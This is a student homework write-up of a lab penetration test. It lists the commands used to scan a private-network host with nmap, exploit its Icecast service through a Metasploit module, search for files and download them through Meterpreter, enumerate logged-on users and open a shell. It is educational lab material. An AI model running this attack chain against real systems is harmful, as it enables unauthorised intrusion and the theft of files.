# Activity: Penetration Test Engagement/ Homework 17

Nicole Kemp

April 5th 20222

This is my step by step process to finding all exploits and the secret files, aswell as proof of concept via screenshots.


### Instructions

I've been provided full access to the network and are getting ping responses from the CEO’s workstation.

1. Perform a service and version scan using Nmap to determine which services are up and running:

    - Run the Nmap command that performs a service and version scan against the target.
![image](https://user-images.githubusercontent.com/91113466/161770835-3a08eb97-dc39-4b9e-aeef-ccd6305595db.png)
      > Answer: nmap -sV 192.168.0.20
2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:

   - Run the SearchSploit commands to show available Icecast exploits.
  ![image](https://user-images.githubusercontent.com/91113466/161771102-568347c1-de61-4ab8-8bfc-9545caed2f00.png)

     > Answer: searchsploit icecast
3. Now that we know which exploits are available to us, let's start Metasploit:

   - Run the command that starts Metasploit:
![image](https://user-images.githubusercontent.com/91113466/161771161-f472393f-d160-4c37-8902-179c59340bc4.png)

     > Answer: msfconsole
4. Search for the Icecast module and load it for use.

   - Run the command to search for the Icecast module:
![image](https://user-images.githubusercontent.com/91113466/161771246-9be372c8-f3f1-45de-bbf7-04090066c55d.png)

     > Answer: search icecast

   - Run the command to use the Icecast module:

       **Note:** Instead of copying the entire path to the module, you can use the number in front of it.

     > Answer: use 0
5. Set the `RHOST` to the target machine.

   - Run the command that sets the `RHOST`:

     > Answer: set RHOST 192.168.0.20
![image](https://user-images.githubusercontent.com/91113466/161771522-1b71ab13-c2d1-4278-aef3-677aadf2725a.png)

6. Run the Icecast exploit.

   - Run the command that runs the Icecast exploit.

     > Answer: run

   - Run the command that performs a search for the `secretfile` textfile on the target.
![image](https://user-images.githubusercontent.com/91113466/161771624-dae887fe-eace-4f57-b859-540b10809111.png)

     > Answer: search -f *secretfile*.txt
7. You should now have a Meterpreter session open.

    - Run the command to performs a search for the `recipe` textfile on the target:
      > Answer: search -f *recipe*.txt
 ![image](https://user-images.githubusercontent.com/91113466/161771713-33a1264c-8f55-4597-bead-e207cb2b6f07.png)

    - **Bonus**: Run the command that exfiltrates the `recipe` textfile:
      > Answer: download 'c:/Users/IEuser/Documents/Drinks.recipe.txt'
![image](https://user-images.githubusercontent.com/91113466/161771765-c1a89b8f-92f3-42fc-a0ec-cf0bf3970d38.png)

8. You can also use Meterpreter's local exploit suggester to find possible exploits.

   - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.
![image](https://user-images.githubusercontent.com/91113466/161771830-85422fb7-1922-4bad-a6fb-b73cb7424345.png)


### Bonus
  
A. Run a Meterpreter post script that enumerates all logged on users.

  > Answer: run post/windows/gather/enum_logged_on_users
  > 
![image](https://user-images.githubusercontent.com/91113466/161771905-2a2032be-1596-4a9b-a275-f8e9f3488665.png)

B. Open a Meterpreter shell and gather system information for the target.

  > Answer: shell 
 
![image](https://user-images.githubusercontent.com/91113466/161771972-25fb7401-845f-4701-b2b7-2ff931b2d33f.png)

C. Run the command that displays the target's computer system information:

   > Answer: systeminfo

![image](https://user-images.githubusercontent.com/91113466/161772013-d4059380-d523-4285-8288-5f8b5c932850.png)
